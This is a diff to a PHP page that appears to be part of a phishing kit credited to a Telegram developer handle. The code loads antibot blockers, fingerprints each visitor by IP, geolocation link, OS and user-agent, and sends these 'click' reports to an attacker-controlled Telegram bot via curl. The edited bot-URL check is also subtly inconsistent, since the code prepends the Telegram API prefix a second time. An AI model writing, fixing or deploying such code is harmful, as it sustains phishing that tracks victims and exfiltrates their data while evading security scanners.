@@ -1,14 +1,43 @@
 <?php
 error_reporting(0);
 session_start();
-include('Antibot/pro.php');
-include('Antibot/blocker.php');
-include('Antibot/blocker_1.php');
-include('Antibot/blocker_2.php');
-include('Antibot/blocker_3.php');
-include('Antibot/blocker_4.php');
-include('session/function.php');
 include('config.php');
+include('antibot.php');
+
+// Capture User-Agent once for reuse
+$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+// Safe fallback for $IP
+if (!isset($IP)) {
+    $raw_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
+    $IP = filter_var($raw_ip, FILTER_VALIDATE_IP) ? $raw_ip : 'Unknown';
+}
+
+// Safe fallback for $os
+if (!isset($os)) {
+    if (stripos($ua, 'Windows') !== false) {
+        $os = 'Windows';
+    } elseif (stripos($ua, 'Android') !== false) {
+        $os = 'Android';
+    } elseif (stripos($ua, 'iPhone') !== false || stripos($ua, 'iPad') !== false) {
+        $os = 'iOS';
+    } elseif (stripos($ua, 'Mac') !== false) {
+        $os = 'Mac OS';
+    } elseif (stripos($ua, 'Linux') !== false) {
+        $os = 'Linux';
+    } else {
+        $os = 'Unknown';
+    }
+}
+
+// Safe fallback for $settings
+if (!isset($settings) || !is_array($settings)) {
+    $settings = [
+        'send_clicks' => '0',
+        'chat_id'     => '',
+        'bot_url'     => '',
+    ];
+}
 
 // Check for existing visitor key in cookie
 if(!isset($_COOKIE['visitor_key'])) {
@@ -55,13 +84,16 @@ $msgtg .= "• Location: <code>http://www.geoiptool.com/?IP={$IP}</code>\n\n";
 
 $msgtg .= "💻 <b>DEVICE INFO</b>\n";
 $msgtg .= "• Browser: <code>{$os}</code>\n";
-$msgtg .= "• User-Agent: <code>" . substr($_SERVER['HTTP_USER_AGENT'], 0, 100) . "...</code>\n\n";
+$msgtg .= "• User-Agent: <code>" . substr($ua, 0, 100) . "...</code>\n\n";
 
 $msgtg .= "━━━━━━━━━━━━━━━\n";
 $msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";
 $msgtg .= " + Dev: <a href='https://t.me/xforgex'>@xforgex</a> +";
 
-if ($settings['send_clicks'] == "1"){
+$bot_url = isset($settings['bot_url']) ? $settings['bot_url'] : '';
+$bot_url_valid = strpos($bot_url, 'https://api.telegram.org/bot') === 0;
+
+if (isset($settings['send_clicks']) && $settings['send_clicks'] == "1" && !empty($settings['chat_id']) && $bot_url_valid){
     $send = [
         'chat_id' => $settings['chat_id'],
         'text' => $msgtg,
@@ -69,7 +101,7 @@ if ($settings['send_clicks'] == "1"){
         'disable_web_page_preview' => true
     ];
     
-    $website = "https://api.telegram.org/bot{$settings['bot_url']}";
+    $website = "https://api.telegram.org/bot{$bot_url}";
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
